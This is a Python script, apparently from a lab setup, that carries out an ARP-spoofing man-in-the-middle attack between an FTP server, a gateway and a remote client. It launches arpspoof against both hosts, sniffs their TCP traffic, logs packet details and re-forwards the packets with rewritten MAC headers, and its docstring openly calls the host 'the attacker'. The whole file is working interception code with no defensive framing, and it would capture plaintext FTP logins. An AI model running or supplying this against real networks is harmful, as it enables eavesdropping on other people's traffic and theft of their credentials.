"""
This script performs man-in-the-middle (MITM) packet interception and forwarding using Scapy and ARP spoofing.

Features:
- Intercepts TCP packets between a gateway, FTP server, and a remote client.
- Spoofs ARP to trick devices into routing traffic through this machine.
- Forwards intercepted packets after updating Ethernet MAC headers.
- Prevents forwarding loops using packet hash tracking.
- Ignores traffic from/to 10.10.2.46 to avoid interference with the attacker's own IP.

Key IPs and MACs:
- FTP Server:       192.168.2.8     (MAC: 02:42:c0:a8:02:08)
- Gateway:          192.168.2.254   (MAC: 02:42:90:ce:29:c2)
- Remote Client:    192.168.3.1
- Attacker MAC:     02:42:c0:a8:02:02

"""


from scapy.all import *
import subprocess

# Define IPs and MAC addresses
source_ip = "192.168.2.8"
remote_source_ip = "192.168.3.1"
gateway_ip = "192.168.2.254"
source_mac = "02:42:c0:a8:02:08"
gateway_mac = "02:42:90:ce:29:c2"
my_mac = "02:42:c0:a8:02:02"
ignore_ip = "10.10.2.46"

# Store forwarded packet hashes to prevent infinite loops
forwarded_packets = set()

# Function to handle and forward packets
def packet_handler(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(Ether):
        if pkt[IP].src == ignore_ip or pkt[IP].dst == ignore_ip:
            return  # Ignore packets from/to 10.10.2.46

        # Generate a unique hash for the packet to prevent loops
        pkt_hash = (pkt[IP].src, pkt[IP].dst, pkt[TCP].sport, pkt[TCP].dport, pkt[TCP].seq)
        if pkt_hash in forwarded_packets:
            return  # Ignore already forwarded packets

        print(f"Original Packet: {pkt.summary()}")
        print(f"Source MAC: {pkt[Ether].src} -> Destination MAC: {pkt[Ether].dst}")
        print(f"Source IP: {pkt[IP].src} -> Destination IP: {pkt[IP].dst}")

        # Forward packets to the FTP server
        if pkt[IP].dst == source_ip:
            forward_pkt = Ether(src=my_mac, dst=source_mac) / pkt[IP]
            del forward_pkt[IP].chksum
            del forward_pkt[TCP].chksum
            sendp(forward_pkt, iface="eth0", verbose=False)
            forwarded_packets.add(pkt_hash)

        # Forward packets to the gateway
        elif pkt[IP].dst == gateway_ip:
            forward_pkt = Ether(src=my_mac, dst=gateway_mac) / pkt[IP]
            del forward_pkt[IP].chksum
            del forward_pkt[TCP].chksum
            sendp(forward_pkt, iface="eth0", verbose=False)
            forwarded_packets.add(pkt_hash)

        # Forward packets to the remote client (192.168.3.1)
        elif pkt[IP].dst == remote_source_ip:
            forward_pkt = Ether(src=my_mac, dst=gateway_mac) / pkt[IP]
            del forward_pkt[IP].chksum
            del forward_pkt[TCP].chksum
            sendp(forward_pkt, iface="eth0", verbose=False)
            forwarded_packets.add(pkt_hash)

# Start ARP spoofing
def start_arpspoof():
    subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", source_ip, gateway_ip])
    subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", gateway_ip, source_ip])

start_arpspoof()

# Start sniffing
sniff(
    iface="eth0",
    filter="tcp and not host 10.10.2.46",
    prn=packet_handler,
    store=0
)

